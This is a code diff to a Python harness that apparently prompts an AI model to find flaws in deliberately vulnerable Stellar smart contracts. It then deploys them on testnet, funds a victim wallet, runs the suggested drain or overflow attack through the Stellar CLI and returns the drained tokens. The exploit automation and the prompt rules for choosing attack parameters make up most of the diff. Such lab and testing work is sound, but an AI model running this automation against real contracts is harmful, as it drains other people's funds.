@@ -84,6 +84,11 @@ CRITICAL RULES:
 - If a function takes no arguments, set cli_args to ""
 - If setup requires calling a function first (like deposit/initialize), fill setup_function and setup_cli_args; otherwise set both to null
 - Use these placeholders in cli_args: <ATTACKER>, <VICTIM>, <TOKEN>, <AMOUNT>
+- If the contract has a deposit or initialize function, ALWAYS use it as setup_function to fund the contract before attacking
+- For withdraw attacks, setup_function should be "deposit" with setup_cli_args "--from <VICTIM> --token <TOKEN> --amount <AMOUNT>"
+- For payment-channel initialize, use "--sender <VICTIM> --recipient <ATTACKER> --token <TOKEN> --allowance <AMOUNT> --expiration null"
+- For integer overflow attacks involving a fee percent, ensure you pass both `--amount <AMOUNT>` and `--fee_percent 1`
+- Any argument of type Option<T> should be passed as `null` for None or the bare value (e.g. `10`) for Some.
 
 Contract name: {contract_name}
 ```rust
@@ -102,8 +107,8 @@ Respond ONLY with this exact JSON (no markdown, no explanation):
     "attack_params": {{
         "function_to_call": "exact function name",
         "cli_args": "--param1 <ATTACKER> --param2 <AMOUNT>",
-        "setup_function": "deposit or null",
-        "setup_cli_args": "--from <VICTIM> --token <TOKEN> --amount <AMOUNT> or null"
+        "setup_function": "name of function to call first to deposit funds, or null if not needed",
+    "setup_cli_args": "exact cli args for setup function replacing params with placeholders, or null"
     }}
 }}"""
 
@@ -139,20 +144,117 @@ Respond ONLY with this exact JSON (no markdown, no explanation):
 
 # ── Get balance ─────────────────────────────────────────────
 def get_balance():
+    # To check how much a contract holds, we query the token contract
     cmd = f"""stellar contract invoke \
-        --id {CONTRACT_ID} \
+        --id {TOKEN_ID} \
         --source {VICTIM_SECRET} \
         --network {NETWORK} \
         -- balance \
-        --token {TOKEN_ID}"""
+        --id {CONTRACT_ID}"""
     out, err, code = run(cmd)
     try:
-        return int(out.replace('"', '').strip())
+        # It usually outputs something like: 
+        # ℹ️  Simulation identified as read-only...
+        # "100"
+        lines = out.strip().split('\n')
+        val = lines[-1].replace('"', '').strip()
+        return int(val)
     except:
         return 0
 
+# ── Fund victim wallet before each attack ──────────────────
+def fund_victim_wallet(amount=None):
+    """Ensure the victim wallet has XLM (for fees) and tokens before each attack."""
+    if amount is None:
+        amount = TEST_AMOUNT
+
+    print(f"[*] Funding victim wallet with {amount} tokens before attack...")
+
+    # 1) Top-up victim XLM for fees via Stellar friendbot (testnet only)
+    #    No stellar CLI flags needed — uses the requests lib already imported
+    if NETWORK == "testnet":
+        try:
+            resp = requests.get(
+                f"https://friendbot.stellar.org?addr={VICTIM}",
+                timeout=30
+            )
+            if resp.status_code == 200:
+                print(f"[+] Funded victim with XLM via friendbot")
+            else:
+                print(f"[!] Friendbot: {resp.status_code} (victim likely already has XLM)")
+        except Exception as e:
+            print(f"[!] Friendbot request failed: {e}")
+    else:
+        print(f"[!] Non-testnet — XLM top-up skipped (fund victim manually)")
+
+    # 2) Transfer tokens attacker → victim
+    #    v27: --send=yes is a top-level flag BEFORE '--', not a contract function arg
+    if TOKEN_ID:
+        transfer_cmd = f"""stellar contract invoke \
+            --id {TOKEN_ID} \
+            --source {ATTACKER_SECRET} \
+            --network {NETWORK} \
+            --send=yes \
+            -- transfer \
+            --from {ATTACKER} \
+            --to {VICTIM} \
+            --amount {amount}"""
+        out, err, code = run(transfer_cmd)
+        if code == 0:
+            print(f"[+] Transferred {amount} tokens from attacker to victim")
+        else:
+            print(f"[!] Token transfer skipped: {err[:150]}")
+
+
+
 # ── Execute AI attack ───────────────────────────────────────
-def execute_ai_attack(analysis):
+def deploy_contract(contract_name):
+    """Find and deploy the wasm for a given contract name."""
+    # Search for the wasm file
+    wasm_patterns = [
+        f"vulnerable_contracts/escrow/target/wasm32v1-none/release/{contract_name.replace('-','_')}.wasm",
+        f"target/wasm32v1-none/release/{contract_name.replace('-','_')}.wasm",
+    ]
+    
+    wasm_path = None
+    for pattern in wasm_patterns:
+        matches = glob.glob(pattern)
+        if matches:
+            wasm_path = matches[0]
+            break
+    
+    if not wasm_path:
+        print(f"[-] No wasm found for {contract_name} — trying to build...")
+        build_cmd = f"cd vulnerable_contracts/escrow && stellar contract build 2>/dev/null"
+        run(build_cmd)
+        for pattern in wasm_patterns:
+            matches = glob.glob(pattern)
+            if matches:
+                wasm_path = matches[0]
+                break
+    
+    if not wasm_path:
+        print(f"[-] Could not find wasm for {contract_name} — skipping deployment")
+        return None
+    
+    print(f"[*] Deploying {contract_name} from {wasm_path}...")
+    cmd = f"""stellar contract deploy \
+        --wasm {wasm_path} \
+        --source {VICTIM_SECRET} \
+        --network {NETWORK}"""
+    
+    out, err, code = run(cmd)
+    if code == 0 and out.strip().startswith("C"):
+        print(f"[+] Deployed: {out.strip()}")
+        return out.strip()
+    else:
+        print(f"[-] Deploy failed: {err[:200]}")
+        return None
+
+
+def execute_ai_attack(analysis, contract_name):
+    global CONTRACT_ID
+    
     if not analysis or not analysis.get("vulnerability_found"):
         print("[*] AI found no vulnerability to exploit")
         return False, 0
@@ -161,14 +263,26 @@ def execute_ai_attack(analysis):
     print(f"[*] Executing attack on: {analysis['vulnerable_function']}")
     print(f"[*] Attack plan: {analysis['attack_description']}")
 
+    # Deploy contract if no CONTRACT_ID set
+    if not CONTRACT_ID:
+        deployed_id = deploy_contract(contract_name)
+        if deployed_id:
+            CONTRACT_ID = deployed_id
+        else:
+            print(f"[-] Could not deploy {contract_name} — skipping attack")
+            return False, 0
+
+    # ── Fund victim wallet before every attack ──────────────
+    fund_victim_wallet(TEST_AMOUNT)
+
     params        = analysis.get("attack_params", {})
     func          = params.get("function_to_call", "withdraw")
     cli_args      = substitute_placeholders(params.get("cli_args") or "")
     setup_func    = params.get("setup_function")
     setup_cli_raw = params.get("setup_cli_args")
 
-    # ── Optional setup step (e.g. deposit funds as victim) ──────────────────
-    if setup_func and setup_func != "null" and setup_cli_raw and setup_cli_raw != "null":
+    # Optional setup step
+    if setup_func and setup_func not in ["null", None] and setup_cli_raw and setup_cli_raw not in ["null", None]:
         setup_args = substitute_placeholders(setup_cli_raw)
         print(f"\n[*] Setup: calling {setup_func} as victim...")
         setup_cmd = f"""stellar contract invoke \
@@ -178,17 +292,16 @@ def execute_ai_attack(analysis):
             -- {setup_func} {setup_args}"""
         out, err, code = run(setup_cmd)
         if code != 0:
-            print(f"[-] Setup step failed: {err}")
-            print(f"[*] Continuing anyway — contract may not require setup")
+            print(f"[-] Setup step failed: {err[:200]}")
+            print(f"[*] Continuing anyway")
         else:
             print(f"[+] Setup complete")
     else:
-        print(f"[*] No setup step needed for this contract")
+        print(f"[*] No setup step needed")
 
     balance_before = get_balance()
     print(f"[*] Balance before attack: {balance_before}")
 
-    # ── Execute the attack ───────────────────────────────────────────────────
     print(f"\n[*] AI Agent executing: {func} {cli_args}")
     attack_cmd = f"""stellar contract invoke \
         --id {CONTRACT_ID} \
@@ -206,30 +319,42 @@ def execute_ai_attack(analysis):
     if attack_succeeded and drained > 0:
         print(f"\n[!] ATTACK SUCCEEDED — {drained} XLM drained")
     elif attack_succeeded:
-        print(f"\n[~] Attack call succeeded but balance unchanged — function may not move funds")
+        print(f"\n[~] Attack call succeeded but no funds moved")
     else:
         print(f"\n[*] Attack blocked — {err[:200] if err else 'no error details'}")
 
+    # Reset CONTRACT_ID for next contract
+    CONTRACT_ID = os.environ.get("CONTRACT_ID", "")
+    
     return attack_succeeded and drained > 0, drained
-
 # ── Recover funds ───────────────────────────────────────────
-def recover_funds(amount_xlm):
-    print(f"\n[*] Executing fund recovery — returning {amount_xlm} XLM to victim...")
-    if amount_xlm < MIN_STROOP:
-        print(f"[-] Recovery amount {amount_xlm} XLM is below minimum stroop — skipping")
+def recover_funds(amount_tokens):
+    print(f"\n[*] Executing fund recovery — returning {amount_tokens} tokens to victim...")
+
+    if amount_tokens <= 0:
+        print(f"[-] Nothing to recover")
         return
 
-    amount_str = xlm_to_str(amount_xlm)
-    recovery_cmd = f"""stellar payment send \
+    if not TOKEN_ID:
+        print(f"[-] TOKEN_ID not set — cannot recover tokens")
+        return
+
+    # v27: use stellar contract invoke --send=yes (before '--') to transfer
+    # tokens from attacker back to victim — same pattern as fund_victim_wallet
+    recover_cmd = f"""stellar contract invoke \
+        --id {TOKEN_ID} \
         --source {ATTACKER_SECRET} \
         --network {NETWORK} \
-        --destination {VICTIM} \
-        --asset native \
-        --amount {amount_str}"""
+        --send=yes \
+        -- transfer \
+        --from {ATTACKER} \
+        --to {VICTIM} \
+        --amount {int(amount_tokens)}"""
 
-    out, err, code = run(recovery_cmd)
+    out, err, code = run(recover_cmd)
+
     if code == 0:
-        print(f"[+] RECOVERY SUCCESSFUL — {amount_xlm} XLM returned to victim")
+        print(f"[+] RECOVERY SUCCESSFUL — {amount_tokens} tokens returned to victim")
         try:
             with open("scripts/recovery_task.json", "r") as f:
                 task = json.load(f)
@@ -240,8 +365,8 @@ def recover_funds(amount_xlm):
         except:
             pass
     else:
-        print(f"[-] Recovery failed: {err}")
-        print(f"[-] Manual recovery needed: send {amount_xlm} XLM to {VICTIM}")
+        print(f"[-] Recovery failed: {err[:200]}")
+        print(f"[-] Manual recovery needed: send {amount_tokens} tokens to {VICTIM}")
 
 # ── Schedule fund recovery ──────────────────────────────────
 def schedule_fund_recovery(drained_amount):
@@ -368,7 +493,7 @@ if __name__ == "__main__":
             print(f"    Function      : {analysis.get('attack_params', {}).get('function_to_call', 'N/A')}")
             print(f"    CLI Args      : {analysis.get('attack_params', {}).get('cli_args', 'N/A')}")
 
-            succeeded, drained = execute_ai_attack(analysis)
+            succeeded, drained = execute_ai_attack(analysis, name)  # ← pass name
             attack_results[name] = {"succeeded": succeeded, "drained": drained}
             total_drained += drained
         else:
